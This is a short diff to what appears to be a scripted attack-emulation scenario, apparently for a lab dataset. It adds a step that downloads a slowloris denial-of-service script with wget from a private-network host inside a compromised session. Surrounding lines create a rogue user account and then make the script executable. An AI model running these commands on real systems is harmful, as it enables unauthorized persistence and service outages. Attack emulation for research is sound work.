@@ -51,7 +51,14 @@ sessions -i
 useradd -p "$(openssl passwd -1 password)" cremetest
 
 # ============================================================
-# STEP 5 - End Point DOS
+# STEP 5 - File Download
+# ============================================================
+
+sessions -i
+wget --no-check-certificate http://192.168.56.191:8000/downloads/local_slowloris.py
+
+# ============================================================
+# STEP 6 - End Point DOS
 # ============================================================
 
 chmod +x local_slowloris.py
